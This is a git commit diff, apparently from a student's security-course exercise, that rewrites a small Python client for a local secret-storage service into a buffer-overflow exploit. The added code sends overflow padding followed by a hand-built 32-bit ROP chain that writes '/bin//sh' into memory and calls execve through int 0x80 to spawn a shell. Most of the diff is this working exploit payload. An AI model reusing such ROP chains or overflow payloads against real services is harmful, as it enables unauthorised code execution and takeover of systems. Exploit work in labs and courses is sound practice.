32d64b519692ac110ab329e6fc5bc304ac8c6c50
Soroush <skaram5@uic.edu>
2017-10-28 22:49:06 -0700

    1st Task

--- local.py
+++ local.py
@@ -5,26 +5,53 @@ import socket
 import sys
 import time
 
-if len(sys.argv) != 2:
-    sys.exit("Usage: %s PORT" % sys.argv[0])
+from console import console
+
 
 def send_cmd(cmd):
-    port = int(sys.argv[1])
-    sock = socket.create_connection(('127.0.0.1', port),
+    try:
+        port = int(sys.argv[1])
+        sock = socket.create_connection(('127.0.0.1', port),
                                     socket.getdefaulttimeout(),
                                     ('127.0.0.1', 0))
 
-    sock.sendall(cmd)
+        sock.sendall("a"*1020)
+        sock.sendall(cmd+"\r\n")
+    
+        sock.close()
+    
+    except Exception as e:
+        print(e)
+        pass
+    
+p = ''
 
-    while True:
-        buf = sock.recv(1024)
-        if not buf:
-            break
-        sys.stdout.write(buf)
-    sock.close()
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += '/bin'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139064) # @ .data + 4
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += '//sh'
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080c219d) # mov dword ptr [edx], eax ; ret
+p += pack('<I', 0x080481e1) # pop ebx ; ret
+p += pack('<I', 0x08139060) # @ .data
+p += pack('<I', 0x0812b35b) # pop ecx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x0808522a) # pop edx ; ret
+p += pack('<I', 0x08139068) # @ .data + 8
+p += pack('<I', 0x08048ac1) # xor eax, eax ; ret
+p += pack('<I', 0x080f1016) # pop eax ; ret
+p += pack('<I', 0x0000000b) # 11
+p += pack('<I', 0x08074ded) # int 0x80
 
-send_cmd("PUT SECRET p455w0rd! Secret value\r\n")
-send_cmd("GET SECRET password1\r\n")
-send_cmd("GET SECRET p455w0rd!\r\n")
+c = 'w'
+i = 32
+send_cmd(c*i+p)
 
-# :vim set sw=4 ts=8 sts=8 expandtab:
